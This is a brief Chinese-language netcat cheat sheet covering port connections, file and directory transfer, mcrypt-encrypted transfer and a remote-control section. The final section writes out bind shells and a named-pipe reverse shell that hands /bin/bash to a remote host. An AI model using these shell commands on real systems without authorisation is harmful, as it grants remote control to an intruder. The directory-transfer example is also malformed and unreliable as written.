nc
nc -nv 1.1.1.1 110/25/80 连接邮件，web服务器


传输文件:
a收:nc -lp 333 > 1.txt
b发:nc -nv 1.1.1.1 333 < 1.txt -q 1

a发:nc -lp 333 < 1.txt -q 1
b收:nc -nv 1.1.1.1 333 > 1.txt

传输目录：
发:tar -cvf test/ | nc -lp 333 -q 1
收:nc -nv 1.1.1.1 333 

加密传输文件:
接收并解密:nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > 1.txt  
加密并发送:mcrypt --flush -Fbq -a rijndael-256 -m ecb < 1.txt | nc -nv 1.1.1.1 333 -q 1


远程控制：
正向： 远程： nc -lp 333 -c bash(cmd)
	     本地: nc -nv 1.1.1.1 333
反向：远程: nc -lp 333
	   本地: nc -nv 1.1.1.1 333 -c bash
反弹：本地: nc -lp 333
	    远程：mknod backpipe p；nc 192.168.2.11 333 0<backpipe | /bin/bash 1>backpipe 2>backpipe